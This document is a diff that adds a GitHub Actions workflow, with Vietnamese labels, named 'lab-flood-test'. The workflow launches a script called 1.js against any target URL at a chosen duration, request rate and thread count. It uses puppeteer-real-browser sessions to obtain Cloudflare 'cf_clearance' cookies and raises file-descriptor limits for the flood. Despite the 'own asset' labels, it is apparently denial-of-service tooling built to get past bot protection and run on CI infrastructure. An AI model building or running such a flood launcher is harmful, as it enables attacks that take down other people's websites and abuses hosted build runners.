@@ -1,0 +1,88 @@
+name: lab-flood-test
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target URL (website của bạn)'
+        required: true
+        type: string
+      time:
+        description: 'Thời gian chạy (giây)'
+        required: true
+        default: '30'
+        type: string
+      rate:
+        description: 'Requests/giây/thread'
+        required: true
+        default: '5'
+        type: string
+      threads:
+        description: 'Số worker thread'
+        required: true
+        default: '2'
+        type: string
+      cookie_count:
+        description: 'Số phiên browser để lấy cf_clearance'
+        required: true
+        default: '1'
+        type: string
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    env:
+      NODE_OPTIONS: '--max-old-space-size=4096'
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install system deps (Chrome + Xvfb)
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends \
+            xvfb libnss3 libatk-bridge2.0-0 libgtk-3-0 \
+            libgbm1 libasound2t64 fonts-liberation ca-certificates
+          npx puppeteer browsers install chrome --install-deps
+
+      - name: Install npm deps
+        run: |
+          if [ -f package.json ]; then
+            npm install
+          else
+            npm init -y >/dev/null
+            npm i puppeteer-real-browser
+          fi
+
+      - name: Raise fd limit
+        run: |
+          sudo bash -c 'echo "fs.file-max=200000" >> /etc/sysctl.conf'
+          echo "ulimit -n 65536" >> $GITHUB_ENV
+          ulimit -n
+
+      - name: Run flood (own asset)
+        env:
+          TARGET: ${{ inputs.target }}
+          TIME: ${{ inputs.time }}
+          RATE: ${{ inputs.rate }}
+          THREADS: ${{ inputs.threads }}
+          COOKIES: ${{ inputs.cookie_count }}
+        run: |
+          ulimit -n 65536
+          # 1.js nằm ở root repo; nếu khác đường dẫn, sửa lại
+          xvfb-run -a --server-args="-screen 0 1920x1080x24" \
+            node 1.js "$TARGET" "$TIME" "$RATE" "$THREADS" "$COOKIES" 2>&1 | tee run.log
+
+      - name: Upload log
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: flood-log
+          path: run.log
